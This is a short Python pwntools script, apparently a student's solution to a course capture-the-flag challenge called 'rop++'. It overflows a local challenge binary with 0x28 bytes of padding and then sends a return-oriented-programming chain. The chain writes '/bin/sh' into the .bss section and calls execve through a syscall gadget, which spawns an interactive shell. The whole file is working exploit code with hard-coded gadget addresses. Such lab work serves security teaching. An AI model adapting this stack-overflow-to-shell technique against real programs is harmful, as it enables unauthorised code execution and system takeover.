from pwn import *

context.arch = "amd64"

bss_addr = 0x4c72a0

mov_rdx_ptr_rsi = 0x48cfe5
pop_rax_ret = 0x447b27
pop_rdi_ret = 0x401e3f
pop_rsi_ret = 0x409e6e
pop_rdx_rbx_ret = 0x47ed0b
syscall_ret = 0x414506

ROP = flat(
    # write "/bin/sh" to .bss
    pop_rdx_rbx_ret, b"/bin/sh\x00", 0,
    pop_rsi_ret, bss_addr,
    mov_rdx_ptr_rsi,

    # execve("/bin/sh", NULL, NULL)
    pop_rax_ret, 0x3b,
    pop_rdi_ret, bss_addr,
    pop_rsi_ret, 0,
    pop_rdx_rbx_ret, 0, 0,
    syscall_ret
)

r = process("/home/lemtea/Course/資訊安全實務/pwn/rop++/rop++/share/chal")

r.recvuntil(b"> ")
r.send(b"A" * 0x28 + ROP)   

r.interactive()
r.close()